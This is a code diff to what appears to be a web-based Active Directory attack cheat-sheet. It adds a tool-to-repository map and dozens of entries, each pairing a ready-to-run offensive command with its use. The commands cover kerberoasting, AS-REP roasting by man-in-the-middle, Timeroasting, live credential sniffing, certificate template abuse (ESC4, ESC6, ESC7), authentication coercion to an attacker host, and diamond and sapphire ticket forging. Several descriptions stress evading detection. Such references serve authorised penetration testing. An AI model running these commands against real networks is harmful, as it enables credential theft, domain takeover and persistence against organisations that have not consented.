@@ -172,7 +172,8 @@ function shellOf(entry) {
     "PingCastle", "ADRecon", "Group3r", "Snaffler", "nltest", "klist", "LaZagne",
     "comsvcs.dll", "DSInternals", "ntdsutil", "DomainPasswordSpray", "Certify",
     "Whisker", "SharpGPOAbuse", "LAPSToolkit", "Get-LapsADPassword", "Windows PrivEsc",
-    "RunasCs", "SharpDPAPI", "RemotePotato0", "Inveigh", "PowerView",
+    "RunasCs", "SharpDPAPI", "RemotePotato0", "Inveigh", "PowerView", "AD Explorer",
+    "Sapphire Ticket", "Invoke-AuthenticatedTimeRoast", "SOAPHound", "Invoke-GPOwned",
   ];
   if (winTools.some((t) => entry.tool.includes(t) || entry.command.includes(t))) return "win";
   if (entry.command.startsWith("MATCH") || entry.command.startsWith("#")) return "none";
@@ -195,6 +196,18 @@ function bashQuote(value) {
   return out;
 }
 
+// Basenames of actual Impacket example scripts — used to gate the .py ->
+// impacket-* variant below so an unrelated tool that happens to be invoked as
+// some-script.py (e.g. smartbrute.py, noPac.py) doesn't get a fake
+// "impacket-<name>" binary suggested for it.
+const IMPACKET_SCRIPT_NAMES = new Set([
+  "secretsdump", "GetUserSPNs", "GetNPUsers", "GetTGT", "getST", "ticketer",
+  "ticketConverter", "psexec", "wmiexec", "smbexec", "atexec", "ntlmrelayx",
+  "addcomputer", "changepasswd", "dacledit", "describeTicket", "findDelegation",
+  "GetADComputers", "GetADUsers", "lookupsid", "mssqlclient", "owneredit",
+  "rbcd", "smbpasswd", "reg",
+].map((s) => s.toLowerCase()));
+
 // Some tools are invoked under more than one valid binary name depending on
 // how they were installed or which OS/shell is being used. This returns every
 // variant a command should be shown as, so Commands AND Attack Paths both stay
@@ -209,7 +222,7 @@ function bashQuote(value) {
 // means there's nothing else to show.
 function getCommandVariants(command) {
   const pyMatch = command.match(/^([A-Za-z0-9]+)\.py\b/);
-  if (pyMatch) {
+  if (pyMatch && IMPACKET_SCRIPT_NAMES.has(pyMatch[1].toLowerCase())) {
     return [
       { label: "Script (.py)", command },
       { label: "Package binary (impacket-*)", command: command.replace(/^([A-Za-z0-9]+)\.py\b/, `impacket-${pyMatch[1]}`) },
@@ -288,6 +301,133 @@ const PHASES = [
 ];
 
 const phaseOf = (id) => PHASES.find((p) => p.id === id);
+
+// GitHub source for every open-source tool referenced across ENTRIES, keyed by
+// the exact string that would otherwise be shown as entry.tool. Grouped/combo
+// labels (Impacket scripts, GTFOBins binaries, Windows PrivEsc sub-tools, and
+// "A / B" combo labels) are resolved by repoFor() below instead of being
+// listed here one-by-one. Native OS binaries (net, nltest, reg, klist,
+// ntdsutil, rpcclient...), built-in cmdlets (Get-ADUser, Set-ADAccountPassword...),
+// and bare technique/CVE names with no canonical tool repo are deliberately
+// left unmapped rather than pointed at a guessed URL.
+const TOOL_REPOS = {
+  "AADInternals": "https://github.com/Gerenios/AADInternals",
+  "AD Explorer": "https://learn.microsoft.com/en-us/sysinternals/downloads/adexplorer",
+  "ADRecon": "https://github.com/adrecon/ADRecon",
+  "AdaptixC2": "https://github.com/Adaptix-Framework/AdaptixC2",
+  "ASRepCatcher": "https://github.com/Yaxxine7/ASRepCatcher",
+  "AzureHound": "https://github.com/SpecterOps/AzureHound",
+  "BOFHound": "https://github.com/coffeegist/bofhound",
+  "BloodHound": "https://github.com/SpecterOps/BloodHound",
+  "BloodHound-CE": "https://github.com/SpecterOps/BloodHound",
+  "BloodHound-CE (bloodhound-python)": "https://github.com/dirkjanm/BloodHound.py",
+  "Certify": "https://github.com/GhostPack/Certify",
+  "Certipy": "https://github.com/ly4k/Certipy",
+  "Chisel": "https://github.com/jpillora/chisel",
+  "Coercer": "https://github.com/p0dalirius/Coercer",
+  "DFSCoerce": "https://github.com/Wh04m1001/DFSCoerce",
+  "DonPAPI": "https://github.com/login-securite/DonPAPI",
+  "DSInternals": "https://github.com/MichaelGrafnetter/DSInternals",
+  "Dumpert": "https://github.com/outflanknl/Dumpert",
+  "GoldenGMSA": "https://github.com/Semperis/GoldenGMSA",
+  "GPOddity": "https://github.com/ShutdownRepo/GPOddity",
+  "GPOwned": "https://github.com/X-C3LL/GPOwned",
+  "Group3r": "https://github.com/Group3r/Group3r",
+  "Hashcat": "https://github.com/hashcat/hashcat",
+  "Havoc": "https://github.com/HavocFramework/Havoc",
+  "Inveigh": "https://github.com/Kevin-Robertson/Inveigh",
+  "Invoke-GPOwned": "https://github.com/n0troot/Invoke-GPOwned",
+  "JohnTheRipper": "https://github.com/magnumripper/JohnTheRipper",
+  "Invoke-SessionHunter": "https://github.com/Leo4j/SessionHunter",
+  "Invoke-noPac": "https://github.com/Ridter/noPac",
+  "Kerbrute": "https://github.com/ropnop/kerbrute",
+  "kerberoast (skelsec)": "https://github.com/skelsec/kerberoast",
+  "modifyCertTemplate": "https://github.com/fortalice/modifyCertTemplate",
+  "LAPSToolkit": "https://github.com/leoloobeek/LAPSToolkit",
+  "LDAPDomainDump": "https://github.com/dirkjanm/ldapdomaindump",
+  "LaZagne": "https://github.com/AlessandroZ/LaZagne",
+  "Ligolo-ng": "https://github.com/nicocha30/ligolo-ng",
+  "Mimikatz": "https://github.com/gentilkiwi/mimikatz",
+  "NetExec (nxc)": "https://github.com/Pennyw0rth/NetExec",
+  "Nmap": "https://github.com/nmap/nmap",
+  "PKINITtools (gettgtpkinit.py)": "https://github.com/dirkjanm/PKINITtools",
+  "PetitPotam": "https://github.com/topotam/PetitPotam",
+  "PingCastle": "https://github.com/vletoux/pingcastle",
+  "PassTheCert": "https://github.com/AlmondOffSec/PassTheCert",
+  "Pcredz": "https://github.com/lgandx/PCredz",
+  "PowerHuntShares": "https://github.com/NetSPI/PowerHuntShares",
+  "pyGPOabuse": "https://github.com/Hackndo/pyGPOAbuse",
+  "PowerView": "https://github.com/PowerShellMafia/PowerSploit",
+  "PowerView / ActiveDirectory module": "https://github.com/PowerShellMafia/PowerSploit",
+  "PowerView.py (aniqfakhrul)": "https://github.com/aniqfakhrul/powerview.py",
+  "PowerShell": "https://github.com/PowerShell/PowerShell",
+  "PowerShell Remoting": "https://github.com/PowerShell/PowerShell",
+  "PrivExchange": "https://github.com/dirkjanm/PrivExchange",
+  "ROADtools (roadrecon)": "https://github.com/dirkjanm/ROADtools",
+  "RemotePotato0": "https://github.com/antonioCoco/RemotePotato0",
+  "Responder": "https://github.com/lgandx/Responder",
+  "Rubeus": "https://github.com/GhostPack/Rubeus",
+  "Rubeus / SpoolSample": "https://github.com/GhostPack/Rubeus",
+  "RunasCs": "https://github.com/antonioCoco/RunasCs",
+  "Sapphire Ticket": "https://github.com/Semperis/SapphireTicket",
+  "SCCMHunter": "https://github.com/garrettfoster13/sccmhunter",
+  "SafetyKatz": "https://github.com/GhostPack/SafetyKatz",
+  "SharpDPAPI": "https://github.com/GhostPack/SharpDPAPI",
+  "SharpGPOAbuse": "https://github.com/FSecureLABS/SharpGPOAbuse",
+  "SharpKatz": "https://github.com/b4rtik/SharpKatz",
+  "SharpSCCM": "https://github.com/Mayyhem/SharpSCCM",
+  "ShadowCoerce": "https://github.com/ShutdownRepo/ShadowCoerce",
+  "Sliver": "https://github.com/BishopFox/sliver",
+  "smartbrute": "https://github.com/ShutdownRepo/smartbrute",
+  "SOAPHound": "https://github.com/FalconForceTeam/SOAPHound",
+  "Timeroast": "https://github.com/SecuraBV/Timeroast",
+  "timecrack (Timeroast)": "https://github.com/SecuraBV/Timeroast",
+  "Snaffler": "https://github.com/SnaffCon/Snaffler",
+  "TokenTactics": "https://github.com/rvrsh3ll/TokenTactics",
+  "UACME": "https://github.com/hfiref0x/UACME",
+  "WSUSpect / pywsus": "https://github.com/GoSecure/pywsus",
+  "Whisker": "https://github.com/eladshamir/Whisker",
+  "Zerologon (CVE-2020-1472)": "https://github.com/dirkjanm/CVE-2020-1472",
+  "adidnsdump": "https://github.com/dirkjanm/adidnsdump",
+  "bloodyAD": "https://github.com/CravateRouge/bloodyAD",
+  "dnstool.py (krbrelayx)": "https://github.com/dirkjanm/krbrelayx",
+  "krbrelayx": "https://github.com/dirkjanm/krbrelayx",
+  "evil-winrm": "https://github.com/Hackplayers/evil-winrm",
+  "gpp-decrypt": "https://github.com/t0thkr1s/gpp-decrypt",
+  "pypykatz": "https://github.com/skelsec/pypykatz",
+  "pywhisker": "https://github.com/ShutdownRepo/pywhisker",
+  "reg / Mimikatz": "https://github.com/gentilkiwi/mimikatz",
+  "rpcclient": "https://github.com/samba-team/samba",
+  "smbclient": "https://github.com/samba-team/samba",
+  "smbmap": "https://github.com/ShawnDEvans/smbmap",
+  "windapsearch": "https://github.com/ropnop/windapsearch",
+  "xfreerdp": "https://github.com/FreeRDP/FreeRDP",
+  "faketime + noPac": "https://github.com/Ridter/noPac",
+  "noPac": "https://github.com/Ridter/noPac",
+  "proxychains + SSH": "https://github.com/rofl0r/proxychains-ng",
+};
+
+// Sub-tool -> repo for the combined "Windows PrivEsc: <tool>" labels.
+const WIN_PRIVESC_REPOS = {
+  "WinPEAS": "https://github.com/carlospolop/PEASS-ng",
+  "PowerUp": "https://github.com/HarmJ0y/PowerUp",
+  "PrintSpoofer": "https://github.com/itm4n/PrintSpoofer",
+  "GodPotato": "https://github.com/BeichenDream/GodPotato",
+};
+
+// Resolves entry.tool -> a GitHub (or, for closed-source Sysinternals tools,
+// vendor docs) URL, or null when there's no canonical link worth showing
+// (native OS binaries, built-in cmdlets, bare CVE/technique names).
+function repoFor(tool) {
+  if (tool.startsWith("Impacket")) return "https://github.com/fortra/impacket";
+  if (tool.startsWith("GTFOBins")) return "https://github.com/GTFOBins/GTFOBins.github.io";
+  if (tool.startsWith("PKINITtools")) return "https://github.com/dirkjanm/PKINITtools";
+  if (tool.startsWith("Windows PrivEsc: ")) {
+    const sub = tool.replace("Windows PrivEsc: ", "");
+    return WIN_PRIVESC_REPOS[sub] || null;
+  }
+  return TOOL_REPOS[tool] || null;
+}
 
 // Variable convention used throughout every command:
 // $TARGET = target host/IP   $DC = domain controller host/IP   $DOMAIN = domain name (corp.local)
@@ -438,6 +578,24 @@ const ENTRIES = [
     command: "nxc ldap $TARGET -u $USER -p $PASS --bloodhound --collection All --dns-server $DC",
     description: "NetExec's built-in BloodHound collector — pulls the same data SharpHound/bloodhound-python would, straight over LDAP, without needing a separate tool staged. --dns-server is worth setting explicitly whenever the LDAP target's own DNS resolution can't be trusted.",
     useCase: "Fastest path to BloodHound data when nxc is already the tool in hand — one command instead of switching to a dedicated collector.",
+  },
+  {
+    id: "soaphound-collect",
+    tool: "SOAPHound",
+    phase: "recon",
+    title: "Collect AD data over ADWS instead of LDAP",
+    command: "SOAPHound.exe --buildcache -c cache.txt --dc $DC -o output.json",
+    description: "Collects the same kind of object/attribute data SharpHound does, but over Active Directory Web Services (ADWS, TCP 9389) instead of raw LDAP — traffic that blends in with routine RSAT/PowerShell AD module usage instead of standing out as bulk LDAP enumeration.",
+    useCase: "BloodHound-equivalent recon in environments where LDAP querying is heavily logged or alerted on, without ever generating the LDAP traffic that detections are tuned for.",
+  },
+  {
+    id: "bofhound-parse",
+    tool: "BOFHound",
+    phase: "recon",
+    title: "Turn C2 LDAP-search output into BloodHound data",
+    command: "bofhound -i ldapsearch_logs/ -o bloodhound_import/",
+    description: "Parses the raw LDAP search output already produced by C2-framework BOFs (Cobalt Strike's ldapsearch BOF, Sliver, etc.) and converts it into BloodHound-CE-ingestible JSON — full graph data without ever running SharpHound, ADWS, or any dedicated collector.",
+    useCase: "Building a BloodHound graph out of LDAP queries a C2 operator was already going to run for other reasons, when dropping any collector binary at all is too risky or restricted.",
   },
   {
     id: "bloodhound-ce-deploy",
@@ -613,6 +771,60 @@ const ENTRIES = [
     useCase: "Quick roast pass alongside kerberoasting when scripting a full nxc-based sweep.",
   },
   {
+    id: "impacket-getnpusers-hash",
+    tool: "Impacket (GetNPUsers.py)",
+    phase: "cred",
+    title: "AS-REP roasting with an authenticated bind",
+    command: "GetNPUsers.py -request -format hashcat -outputfile $OUTFILE -hashes :$HASH -dc-ip $DC $DOMAIN/$USER",
+    description: "Instead of a bare username list, this binds to LDAP with a known credential (here an NT hash) to dynamically query the full user list itself before checking each one for disabled pre-auth.",
+    useCase: "Skipping the manual users.txt step entirely once you already hold any valid domain credential — the LDAP bind itself finds every candidate.",
+  },
+  {
+    id: "impacket-getuserspns-no-preauth",
+    tool: "Impacket (GetUserSPNs.py)",
+    phase: "cred",
+    title: "Kerberoast without any domain credential (no pre-auth)",
+    command: "GetUserSPNs.py -no-preauth $USER -usersfile services.txt -dc-host $DC $DOMAIN/",
+    description: "Abuses the fact that an AS-REQ can be used to pull a service ticket instead of the usual TGS-REQ, as long as the impersonated account ($USER) doesn't require Kerberos pre-authentication — meaning the whole kerberoast can be run without controlling any AD account at all, only knowing one AS-REP-roastable username and a list of target service accounts.",
+    useCase: "Kerberoasting from a fully unauthenticated position, using an AS-REP-roastable account purely as a stepping stone to request tickets for other services.",
+  },
+  {
+    id: "kerberoast-skelsec",
+    tool: "kerberoast (skelsec)",
+    phase: "cred",
+    title: "Pure-Python kerberoast toolkit",
+    command: "kerberoast spnroast \"kerberos+password://$DOMAIN\\\\$USER:$PASS@$DC\" -o $OUTFILE",
+    description: "A dependency-light, pure-Python alternative to Impacket/Rubeus for kerberoasting, using the same msldap-style connection-string syntax as the author's other tools (pypykatz, msldap).",
+    useCase: "Kerberoasting from environments where staging Impacket or Rubeus isn't practical.",
+  },
+  {
+    id: "pypykatz-spnroast-rc4",
+    tool: "pypykatz",
+    phase: "cred",
+    title: "Force RC4 kerberoast tickets even with AES enabled",
+    command: "pypykatz kerberos spnroast -d $DOMAIN -t $TARGETOBJECT -e 23 \"kerberos+password://$DOMAIN/$USER:$PASS@$DC\"",
+    description: "Explicitly requests etype 23 (RC4) service tickets instead of AES, if the target still accepts it — a krb5tgs$23$ hash cracks dramatically faster than the AES-based krb5tgs$18$ equivalent.",
+    useCase: "Cutting kerberoast cracking time way down on a domain that hasn't disabled RC4, even though AES is also enabled.",
+  },
+  {
+    id: "asrepcatcher-relay",
+    tool: "ASRepCatcher",
+    phase: "cred",
+    title: "AS-REP roast via MitM, without pre-auth being disabled",
+    command: "ASRepCatcher relay -dc $DC",
+    description: "Sits as a man-in-the-middle (ARP spoofing by default) between clients and the DC and captures real AS-REPs off the wire, optionally downgrading the negotiated encryption to RC4 — works even when every account has Kerberos pre-authentication enabled.",
+    useCase: "AS-REP roasting on domains where no account is actually pre-auth-disabled, by intercepting the legitimate exchange instead.",
+  },
+  {
+    id: "asrepcatcher-listen",
+    tool: "ASRepCatcher",
+    phase: "cred",
+    title: "Passively capture AS-REPs (no packet alteration)",
+    command: "ASRepCatcher listen",
+    description: "Passive mode — listens for AS-REP traffic and captures it without any ARP spoofing or encryption-downgrade tampering, for use once a MitM position already exists by other means.",
+    useCase: "Quietly harvesting AS-REPs from an existing network tap/MitM position without adding any active interference.",
+  },
+  {
     id: "nxc-smb-sam",
     tool: "NetExec (nxc)",
     phase: "cred",
@@ -779,9 +991,45 @@ const ENTRIES = [
     tool: "Certipy",
     phase: "privesc",
     title: "Overwrite a template's security (ESC4)",
-    command: "certipy template -u $USER@$DOMAIN -p $PASS -template 'VulnTemplate' -save-old",
-    description: "If you hold write access to a certificate template object itself, reconfigures it into an ESC1-exploitable state, saving the original config to restore afterward.",
+    command: "certipy template -u $USER@$DOMAIN -p $PASS -dc-ip $DC -template 'VulnTemplate' -write-default-configuration",
+    description: "If you hold write access to a certificate template object itself, reconfigures it into an ESC1-exploitable state, automatically backing up the original config to restore afterward. Certipy v5 renamed this from the older -save-old flag — running it twice overwrites the backup, so keep a second copy of the original JSON somewhere safe.",
     useCase: "Turning template write-access (WriteOwner/GenericWrite on the template object) into full impersonation capability.",
+  },
+  {
+    id: "modifycerttemplate-disable-approval",
+    tool: "modifyCertTemplate",
+    phase: "privesc",
+    title: "Precisely disable Manager Approval on a template",
+    command: "modifyCertTemplate.py -template TemplateName -value 0 -property mspki-enrollment-flag $DOMAIN/$USER:$PASS",
+    description: "A more surgical alternative to Certipy's all-in-one ESC4 reconfiguration — edits exactly one attribute at a time, useful when only a specific flag needs flipping rather than the full ESC1-style rewrite.",
+    useCase: "Fine-grained ESC4 exploitation when a template only needs one or two settings changed, minimizing the footprint left on the template object.",
+  },
+  {
+    id: "modifycerttemplate-disable-signature",
+    tool: "modifyCertTemplate",
+    phase: "privesc",
+    title: "Disable the Authorized Signature requirement",
+    command: "modifyCertTemplate.py -template TemplateName -value 0 -property mspki-ra-signature $DOMAIN/$USER:$PASS",
+    description: "Removes the requirement that a request be co-signed by an existing authorized certificate before the CA will issue — another individual precondition for turning a template ESC1-vulnerable.",
+    useCase: "Clearing the signature requirement as one discrete step of a manual ESC4 reconfiguration.",
+  },
+  {
+    id: "modifycerttemplate-enable-san",
+    tool: "modifyCertTemplate",
+    phase: "privesc",
+    title: "Enable SAN specification (ENROLLEE_SUPPLIES_SUBJECT)",
+    command: "modifyCertTemplate.py -template TemplateName -add enrollee_supplies_subject -property msPKI-Certificate-Name-Flag $DOMAIN/$USER:$PASS",
+    description: "Flips the specific flag that allows a requester to supply their own SAN at enrollment time — the core ESC1 primitive, added here to one attribute at a time rather than via Certipy's full template rewrite.",
+    useCase: "The one flag that actually matters if the template already has authentication EKUs and low-priv enrollment — sometimes this alone is enough.",
+  },
+  {
+    id: "modifycerttemplate-add-eku",
+    tool: "modifyCertTemplate",
+    phase: "privesc",
+    title: "Add an authentication EKU to a template",
+    command: "modifyCertTemplate.py -template TemplateName -value \"'1.3.6.1.5.5.7.3.2', '1.3.6.1.5.2.3.4'\" -property pKIExtendedKeyUsage $DOMAIN/$USER:$PASS",
+    description: "Adds Client Authentication and PKINIT Client Authentication EKUs to a template's pKIExtendedKeyUsage, in case the target template didn't already specify an authentication-capable purpose.",
+    useCase: "Completing the ESC4 reconfiguration when a template allows SAN specification but doesn't yet grant an authentication-capable EKU.",
   },
   {
     id: "certipy-ca-backup",
@@ -800,6 +1048,51 @@ const ENTRIES = [
     command: "certipy forge -ca-pfx ca.pfx -upn administrator@$DOMAIN -subject 'CN=administrator,CN=Users,DC=corp,DC=local'",
     description: "Uses a stolen CA private key to mint a fresh, fully valid certificate for any user, entirely offline — never touches the DC until it's used to authenticate.",
     useCase: "Domain-wide persistence that survives password and even krbtgt rotations, as long as the CA key isn't rotated.",
+  },
+  {
+    id: "reg-read-editflags",
+    tool: "Impacket (reg.py)",
+    phase: "recon",
+    title: "Read the CA's EDITF_ATTRIBUTESUBJECTALTNAME2 registry flag",
+    command: "reg.py $DOMAIN/$USER:$PASS@$TARGET query -keyName 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\CA-NAME\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy' -v editflags",
+    description: "Remotely reads the CA's editflags registry value — bit 0x40000 is EDITF_ATTRIBUTESUBJECTALTNAME2, the flag ESC6 depends on. Requires local admin (or equivalent remote registry access) on the CA server.",
+    useCase: "Confirming the current editflags value before ORing in the ESC6 bit, so the write doesn't clobber unrelated flags already set.",
+  },
+  {
+    id: "reg-set-editflags",
+    tool: "Impacket (reg.py)",
+    phase: "privesc",
+    title: "Set the ESC6 flag and restart CertSvc",
+    command: "reg.py $DOMAIN/$USER:$PASS@$TARGET add-keyName 'HKLM\\SYSTEM\\CurrentControlSet\\Services\\CertSvc\\Configuration\\CA-NAME\\PolicyModules\\CertificateAuthority_MicrosoftDefault.Policy' -v editflags -vd <VALUE-OR-ed-0x40000>",
+    description: "Writes editflags back with EDITF_ATTRIBUTESUBJECTALTNAME2 bitwise-ORed into whatever was already set (compute the new value as VALUE | 0x40000 first) — the CA only picks this up after CertSvc is restarted, which requires the same admin-level access.",
+    useCase: "ESC7 Path 1 — turning ManageCA/local-admin-plus-restart-rights into a CA-wide ESC6 condition on demand.",
+  },
+  {
+    id: "certipy-ca-add-officer",
+    tool: "Certipy",
+    phase: "privesc",
+    title: "Grant yourself Manage Certificates (Officer) rights",
+    command: "certipy ca -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CA-NAME' -add-officer $USER",
+    description: "With ManageCA rights on the CA object, remotely adds yourself as a Certificate Manager (\"Officer\") — the second right needed, alongside ManageCA, to approve a denied SubCA enrollment request.",
+    useCase: "Setting up ESC7 Path 2 (the SubCA abuse) when you only started with ManageCA and not ManageCertificates.",
+  },
+  {
+    id: "certipy-ca-list-templates",
+    tool: "Certipy",
+    phase: "recon",
+    title: "List and enable/disable templates on a CA",
+    command: "certipy ca -u $USER@$DOMAIN -p $PASS -dc-ip $DC -ca 'CA-NAME' -list-templates",
+    description: "Lists every template currently enabled on the CA — with ManageCA rights, -enable-template/-disable-template can also toggle which ones are active, including re-enabling the restricted SubCA template if it was disabled.",
+    useCase: "Confirming SubCA (or another restricted template) is enabled before attempting to enroll against it.",
+  },
+  {
+    id: "certipy-ca-issue-retrieve",
+    tool: "Certipy",
+    phase: "privesc",
+    title: "Approve and retrieve a denied SubCA request",
+    command: "certipy ca -u $USER@$DOMAIN -p $PASS -dc-ip $DC -target $TARGET -ca 'CA-NAME' -issue-request 100",
+    description: "SubCA enrollment is restricted to Domain/Enterprise Admins, so a standard user's request fails with CERTSRV_E_TEMPLATE_DENIED — but a request ID is still issued. With both ManageCA and ManageCertificates, this approves that denied request anyway; follow with `certipy req ... -retrieve 100` to pull down the now-issued certificate.",
+    useCase: "The actual privilege-escalation step of ESC7 Path 2 — converting a rejected enrollment into a real, usable certificate via CA-level approval rights.",
   },
   {
     id: "certipy-account",
@@ -836,6 +1129,87 @@ const ENTRIES = [
     command: "hashcat -m 13100 $OUTFILE wordlist.txt -O",
     description: "Mode 13100 cracks kerberoast TGS hashes offline; use mode 18200 for AS-REP hashes instead.",
     useCase: "Turning the hashes pulled by Rubeus/Impacket/nxc into plaintext passwords.",
+  },
+  {
+    id: "john-kerberoast",
+    tool: "JohnTheRipper",
+    phase: "cred",
+    title: "Crack kerberoast hashes with John",
+    command: "john --format=krb5tgs --wordlist=wordlist.txt $OUTFILE",
+    description: "Hashcat alternative for cracking kerberoast TGS hashes — explicit --format is required since John won't always auto-detect the krb5tgs hash type.",
+    useCase: "Cracking kerberoast/AS-REP hashes on a box where Hashcat (or GPU acceleration) isn't available but John is.",
+  },
+  {
+    id: "john-asreproast",
+    tool: "JohnTheRipper",
+    phase: "cred",
+    title: "Crack AS-REP hashes with John",
+    command: "john --wordlist=wordlist.txt $OUTFILE",
+    description: "John auto-detects the krb5asrep hash format from hashcat-mode output, so no explicit --format flag is needed here the way kerberoast hashes require one.",
+    useCase: "Same CPU-based cracking fallback as the kerberoast John entry, for AS-REP hashes specifically.",
+  },
+  {
+    id: "timeroast-unauth",
+    tool: "Timeroast",
+    phase: "cred",
+    title: "Timeroasting — unauthenticated hash extraction",
+    command: "timeroast.py $DC",
+    description: "Abuses MS-SNTP: any unauthenticated client can ask a DC to time-stamp a request 'on behalf of' any RID, and the DC replies with a MAC computed from that computer account's NT hash — extracting crackable hashes for every machine account with zero credentials.",
+    useCase: "Initial-access-stage hash harvesting with literally no foothold at all, at the cost of only getting RIDs back instead of resolved computer names.",
+  },
+  {
+    id: "nxc-timeroast",
+    tool: "NetExec (nxc)",
+    phase: "cred",
+    title: "Timeroasting via NetExec's built-in module",
+    command: "nxc smb $DC -M timeroast",
+    description: "Runs the same unauthenticated MS-SNTP hash-harvesting technique as timeroast.py, built into NetExec's module system instead of a standalone script.",
+    useCase: "One less tool to stage when NetExec is already the primary driver for a recon/attack pass.",
+  },
+  {
+    id: "invoke-authenticatedtimeroast",
+    tool: "Invoke-AuthenticatedTimeRoast",
+    phase: "cred",
+    title: "Timeroasting with automatic RID-to-hostname resolution",
+    command: "Invoke-AuthenticatedTimeRoast -DomainController $DC -GenerateWordlist",
+    description: "With valid domain credentials, this resolves every extracted RID straight to its computer account name via AD queries (no manual correlation needed), and can additionally emit a wordlist built from computer names for cracking machine accounts whose password matches their hostname.",
+    useCase: "A much quieter, faster-to-crack alternative to computer-account kerberoasting once you already hold any domain credential — same idea, far less network noise.",
+  },
+  {
+    id: "hashcat-timeroast",
+    tool: "Hashcat",
+    phase: "cred",
+    title: "Crack SNTP (Timeroast) hashes",
+    command: "hashcat -m 31300 -a 0 -O $OUTFILE wordlist.txt --username",
+    description: "Mode 31300 cracks the MS-SNTP MAC hashes Timeroasting extracts — roughly 10x faster per-guess than a kerberoast TGS-REP hash. Requires Hashcat v7.0.0+; --username is needed because the hash file uses RIDs in place of usernames.",
+    useCase: "Cracking computer-account passwords pulled via Timeroasting far faster than an equivalent kerberoast hash would allow.",
+  },
+  {
+    id: "timecrack",
+    tool: "timecrack (Timeroast)",
+    phase: "cred",
+    title: "Dictionary-crack SNTP hashes without Hashcat",
+    command: "timecrack.py $OUTFILE wordlist.txt",
+    description: "A slower, pure-Python dictionary-attack fallback for SNTP hashes when Hashcat 7.0+ (mode 31300) isn't available.",
+    useCase: "Cracking Timeroast hashes on a box without a recent-enough Hashcat build or GPU to make mode 31300 worthwhile.",
+  },
+  {
+    id: "pcredz-pcap",
+    tool: "Pcredz",
+    phase: "cred",
+    title: "Extract credentials from a pcap file",
+    command: "Pcredz -f capture.pcap",
+    description: "Parses a saved pcap (or, with -d, every pcap in a folder) for cleartext creds, hashes, and other credential material found in plaintext protocols and Kerberos/NTLM exchanges.",
+    useCase: "Pulling credentials out of packet captures you already have — from another tool's traffic capture, a SPAN port dump, or a client's provided pcap.",
+  },
+  {
+    id: "pcredz-live",
+    tool: "Pcredz",
+    phase: "cred",
+    title: "Extract credentials from a live capture",
+    command: "Pcredz -i $INTERFACE -v",
+    description: "Same credential-extraction engine as the pcap-file mode, but sniffing live traffic directly off a network interface instead of a saved capture.",
+    useCase: "Passively harvesting credentials in real time while sitting on a network segment, without needing to capture-then-analyze in two separate steps.",
   },
 
   // ============ LATERAL MOVEMENT ============
@@ -1143,13 +1517,13 @@ const ENTRIES = [
     useCase: "Direct path to Domain Admin on unpatched domains — check patch level before use.",
   },
   {
-    id: "printnightmare-coerce",
+    id: "printerbug-coerce",
     tool: "Rubeus / SpoolSample",
     phase: "privesc",
-    title: "Coerce authentication via Print Spooler",
+    title: "PrinterBug — coerce authentication via Print Spooler (MS-RPRN)",
     command: "SpoolSample.exe $DC $ATTACKER",
-    description: "Forces a machine with an exposed spooler service to authenticate to an attacker host, commonly chained into relay attacks.",
-    useCase: "Same coercion pattern as PetitPotam — useful when EFSRPC is patched but the spooler isn't locked down.",
+    description: "Abuses the MS-RPRN RpcRemoteFindFirstPrinterChangeNotification(Ex) call to force a machine with an exposed spooler service to authenticate to an attacker host — a coercion primitive, not to be confused with PrintNightmare (a separate, RCE-yielding spooler vulnerability covered elsewhere).",
+    useCase: "Same coercion pattern as PetitPotam — useful when EFSRPC is patched but the spooler isn't locked down. Commonly chained straight into an NTLM/Kerberos relay.",
   },
   {
     id: "unconstrained-deleg",
@@ -1226,6 +1600,24 @@ const ENTRIES = [
     useCase: "Forging tickets from a Linux attack host without needing Mimikatz on Windows.",
   },
   {
+    id: "impacket-ticketer-request-diamond",
+    tool: "Impacket (ticketer.py)",
+    phase: "persist",
+    title: "Diamond ticket from Linux (ticketer.py -request)",
+    command: "ticketer.py -request -domain $DOMAIN -user $USER -password $PASS -nthash $HASH -domain-sid $SID -user-id 500 -groups 512 $USER",
+    description: "The Linux/Impacket equivalent of a Rubeus diamond ticket — -request performs a real AS-REQ for the account you already hold credentials for ($USER), then re-signs that genuinely KDC-issued ticket's PAC with the krbtgt hash to inject Domain Admins-level group membership, instead of forging the whole ticket offline.",
+    useCase: "Same detection-evasion value as Rubeus's diamond ticket (dodges golden-ticket fingerprints like offline construction and mismatched logon events), but from a Linux attack host with no Rubeus/Windows execution needed.",
+  },
+  {
+    id: "impacket-ticketer-request-sapphire",
+    tool: "Impacket (ticketer.py)",
+    phase: "persist",
+    title: "Sapphire ticket from Linux (ticketer.py -request -impersonate)",
+    command: "ticketer.py -request -impersonate administrator -domain $DOMAIN -user $USER -password $PASS -nthash $HASH -domain-sid $SID -user-id 500 administrator",
+    description: "Adding -impersonate to -request drives a genuine S4U2Self round-trip through the KDC as the impersonated target user, pulling back that user's real, KDC-built PAC instead of hand-editing group/RID fields yourself — the same detection-resistance idea as a Sapphire ticket, from an Impacket/Linux host instead of SapphireTicket.exe.",
+    useCase: "Closing the same PAC-inconsistency gaps a plain diamond ticket leaves behind, without needing a Windows host or the standalone Sapphire Ticket tool at all.",
+  },
+  {
     id: "silver-ticket",
     tool: "Mimikatz",
     phase: "persist",
@@ -1233,6 +1625,15 @@ const ENTRIES = [
     command: "kerberos::golden /user:administrator /domain:$DOMAIN /sid:$SID /target:$DC /service:cifs /rc4:$HASH /ptt",
     description: "Forges a TGS for a specific service using that service account's hash, without touching the DC or krbtgt.",
     useCase: "Quieter and more targeted than a golden ticket — access to one specific service, harder to detect.",
+  },
+  {
+    id: "sapphire-ticket",
+    tool: "Sapphire Ticket",
+    phase: "persist",
+    title: "Sapphire ticket",
+    command: "SapphireTicket.exe /krbtgt:$HASH /domain:$DOMAIN /dc:$DC /ticketuser:administrator /ticketuserid:500 /groups:512",
+    description: "Extends the Diamond Ticket technique by performing an S4U2self round-trip against the KDC to obtain a fully legitimate PAC for the target identity before splicing it into the forged ticket — closing the PAC-inconsistency gaps that Diamond Tickets still leave behind.",
+    useCase: "The most detection-resistant public ticket-forging technique — specifically defeats PAC-validation-based detections built to catch Golden/Diamond tickets.",
   },
   {
     id: "adminsdholder",
@@ -1419,6 +1820,24 @@ const ENTRIES = [
     command: "Invoke-ADRecon.ps1 -DomainController $DC -Credential $DOMAIN\\$USER",
